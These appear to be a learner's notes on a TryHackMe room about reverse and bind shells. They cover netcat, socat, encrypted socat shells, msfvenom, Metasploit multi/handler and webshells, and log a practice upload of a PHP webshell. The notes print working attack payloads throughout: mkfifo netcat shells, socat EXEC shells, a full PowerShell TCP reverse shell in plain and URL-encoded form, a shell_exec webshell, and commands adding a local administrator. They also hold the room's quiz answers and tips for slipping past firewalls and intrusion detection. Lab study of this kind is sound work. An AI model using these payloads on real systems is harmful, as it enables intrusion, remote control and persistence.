1.What is a shell?

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open 
up a port on the server which we can connect to in order to execute further commands (a bind shell).

2.Tools


https://github.com/swisskyrepo/PayloadsAllTheThings
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://github.com/danielmiessler/SecLists

3.Types of Shell

Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would 
use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse 
shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however,
the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to 
accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the 
network.

Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. 
This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code
execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by 
firewalls protecting the target.

Answer:R,N,T

4.Netcat

    -l is used to tell netcat that this will be a listener
    -v is used to request a verbose output
    -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
    -p indicates that the port specification will follow.

sudo nc -lvnp 443

The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a 
service using it. 
Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often
a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound 
firewall rules on the target.

Answer:-l,nc 10.10.10.11 8080

5.Netcat Shell Stabilisation

Example of python method:

sudo nc -lvnp 443
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
whoami

The command with python has to be checked if it is python,python2,python3

Method two is rlwrap

sudo apt install rlwrap

rlwrap nc -lvnp <port>

This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, 
it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg 
to stabilise and re-enter the shell. 

Method three is socat

A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), 
then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat). 
Dont use it for Windows.

Use stty -a to get to know how much  rows and columns are used in your own shell after that use it for the target machine so you have an accurate shell

Next, in your reverse/bind shell, type in:
ssty row <number>
ssty column <number>

Answer:stty cols 238,sudo python3 -m http.server 80

6.Socat 

probably gonna try to implement socat more into my basic knowledge since it allows interactive commands and has a more stable shell

Reverse Shell:

The basic command for the listener,try to use the more stable one later on:
socat TCP-L:<port> 

Linux i guess we go on the bash command 
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Windows command, makes sense since we wanna powershell 
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

Bind Shell:

Linux
socat TCP-L:<PORT> EXEC:"bash -li"

Windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
socat TCP:<TARGET-IP>:<TARGET-PORT> -

Little remainder for Bind/Reverse Shell:
In a reverse shell, the remote machine initiates the connection and sends a request to connect to the target machine. 
In a bind shell, the target machine listens for incoming connections and provides a shell interface when a connection is 
established.

Why reverse shells are used more for bypassing.
With a reverse shell, attackers can often bypass security controls, like firewalls. While firewalls may prevent bind shell 
attacks because they filter incoming traffic, they often provide fewer limits for outgoing connections, meaning they won't 
capture the malicious activity.

The more stable listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0 

Explanation for tty,who command 
https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific 
socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, 
however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

When u need to get the precompiled socat binary you can download it here:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

The command to connect back to the listener
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

Answer:TCP-L:8080

7.Socat Encrypted Shells

Created to often bypass IDS (Intrusion Detection Systems) 

Creating a cert on our attacking machine, then we can use it for the encrypted shell.
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

Merge our 2 files into a single .pem file
cat shell.key shell.crt > shell.pem

Now we setup our listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly 
signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

Connecting 
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

For bind shell:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

Used hint to get to know its FILE:"tty",raw,echo=0
Answer:socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

Okay had to google the second answer link is below
https://medium.com/@zycc2727/tryhackme-what-the-shell-61b54eda78e6
Answer:socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane

I understand the idea of using a encrypted shell since it avoids detection.

8.Common Shell Payloads

A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat 
(including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there 
is a -e option which allows you to execute a process on connection. For example, as a listener:

nc -lvnp <PORT> -e /bin/bash

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always 
required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now 
-- the command itself is what matters.
The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output 
of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input 
of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell:

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read
($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2
= $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.
Close()"

In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of
executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell.

For other common reverse shell payloads, PayloadsAllTheThings is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), 
in many different languages. It is well worth reading through the linked page to see what's available.

Answer:mkfifo

9.msfvenom

The standard syntax for msfvenom is as follows:

msfvenom -p <PAYLOAD> <OPTIONS>

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

Here we are using a payload and four options:
-f <format>  Specifies the output format. In this case that is an executable (exe)
-o <file>    The output location and filename for the generated payload.
LHOST=<IP>   Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
LPORT=<port> The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted 
             and require a listener running with root privileges.

Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a 
waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, 
executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a 
small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the 
Metasploit multi/handler, which will be covered in the next task.
Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, 
sends a shell back immediately to the waiting listener.

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
<OS>/<arch>/<payload>
linux/x86/shell_reverse_tcp

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.
In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 
The staged equivalent to this payload would be:
shell/reverse_tcp
As staged payloads are denoted with another forward slash (/).
This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
windows/x64/meterpreter/reverse_tcp
A Linux 32bit stageless Meterpreter payload would look like this:
linux/x86/meterpreter_reverse_tcp

This command should show you the if there is a useable payload for revers tcp and it shows you staged or stagless.
msfvenom --list payloads | grep "linux/x64/meterpreter"

I used the command msfconsole to start the metasploit framework then i used the command help to see which commands are available.
I have seen that the command search is in msfconsole then i typed search linux x64 reverse.In line 27 i found the payload that we would use since it has to be a meterpreter 
and staged.You can use this method if u are already familiar with staged and stagless and if are maybe already in the msfconsole then it could be faster.

Answers:_,msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

10.Metasploit multi/handler

In this topic we get informations about the tool multi/handler in the metasploit framework with that we can catch incoming reverse shells.It is essential if you wanna use
meterpreter shells for staged loads.Use sudo mfconsole then you can use ports under 1024 that are more often not restricted or blocked since ports over 1024 are not that 
common and could get picked up by a firewall/IDS or similiar.

Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to 
listen with (when using TryHackMe, this will be your tun0 address,the ip you got when you connect to the Tryhackme network)

The -q is to NOT show the banner 

sudo msfconsole -q
use mulit/handler
set PAYLOAD
set LHOST
set LPORT

exploit -j

if something connects to our set up listener then it should generate a session id and then we can switch with the command to the session.

session 1

Answers:exploit -j,session 10

11.WebShells

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially,
commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned 
and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

Example:

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after
?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

with ?cmd=ifconfig you can check the ip configs on a linux target for example

https://pentestmonkey.net/tools/web-shells/php-reverse-shell

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell.
The following looks pretty wild you would have to look up how urls are encoded for a better understanding.
This would be copied into the URL as the cmd argument:

Encoded:
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5B
byte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24
data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20
Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5B
text.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

Decoded:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[
byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$
data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | 
Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([
text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Google for url decoder and encoder to find a websites that can help you with this for example:
https://meyerweb.com/eric/tools/dencoder/

For a better understanding you can read this https://en.wikipedia.org/wiki/Percent-encoding

Dont worry if u dont understand it.This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. 
Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

12.Next Steps

The important take away from this task:

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. 
Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this.


Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.In such a situation it's possible to
simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on 
the services running on the box.

The syntax for this is as follows:

net user <username> <password> /add
net localgroup administrators <username> /add


13.Practice and Examples

I started the linux practice box and connected via openvpn to the tryhackme network and then i used ssh with the infos of the task 14.Then i looked up with nmap the 
1024 common ports and i got informations about that the port 22 and 80 is open.I opened the browser and typed in the machine_ip.
On the website i have the possibility to click the browse button to choose a file and then submit it.When i wann initiate a reverse connection i have to open the uploaded 
file then with machine_ip/uploads/xxx or look it up in the folder machine_ip/uploads in the browser.

I wrote following code from the task with the webshells in a shell.php file and uploaded it.

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>


Then i opened the website and used the ifconfig to see if it works like the example in the previous tasks.
http://x.x.x.x/uploads/shell.php?cmd=ifconfig

I can change the ifconfig for example to whoami and get the info that the user is www-data.
http://x.x.x.x/uploads/shell.php?cmd=whoami

For the next task we browse to the file php-reverse-shell.php in the folder /usr/share/webshells/php/ and then we edit it to change the ip to our tun0 ( the ip we get with our
machine when we use openvpn to connect to the tryhackme network) and the port (i choose something above 1024).When u edit the file with nano in the terminal dont forget to use
sudo because it is a write protected file.

When we modified the file we can upload it and before we browse and open the file 

<break for food :)>

14.Linux Practice Box



15.Windows Practice Box



